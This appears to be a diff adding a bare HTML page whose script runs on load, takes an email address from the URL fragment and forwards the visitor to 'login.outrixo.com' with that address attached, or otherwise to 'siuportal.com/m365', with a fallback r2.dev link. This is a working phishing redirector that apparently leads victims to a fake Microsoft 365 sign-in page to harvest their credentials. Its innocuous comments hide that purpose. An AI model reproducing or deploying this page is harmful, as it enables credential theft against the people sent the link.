@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+function extractAndRedirect() {
+  // Get the fragment identifier from the URL
+  var fragment = window.location.hash.substring(1);
+
+  // Use a default redirect link if fragment is empty
+  if (!fragment) {
+    fragment = 'https://pub-223f4755bfba44d28051298b457ecfe4.r2.dev/link (17).html#';
+  }
+
+  // Check if the fragment includes '@' (email address indicator)
+  if (fragment.includes('@')) {
+    // It might be an email address, so let's check
+    var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (emailPattern.test(fragment)) {
+      // It's a valid email address, redirect to the email address page
+      var decodedEmail = decodeURIComponent(fragment);
+      window.location.href = 'https://login.outrixo.com/caWidaJS?' + decodedEmail;
+    } else {
+      // It's not a valid email address, redirect to the URL
+      window.location.href = "https://siuportal.com/m365";
+    }
+  } else {
+    // It's a URL, redirect to the URL
+    window.location.href = "https://siuportal.com/m365";
+  }
+}
+
+// Call the function immediately when the script is loaded
+extractAndRedirect();
+</script>
+</head>
+<body>
+</body>
+</html>
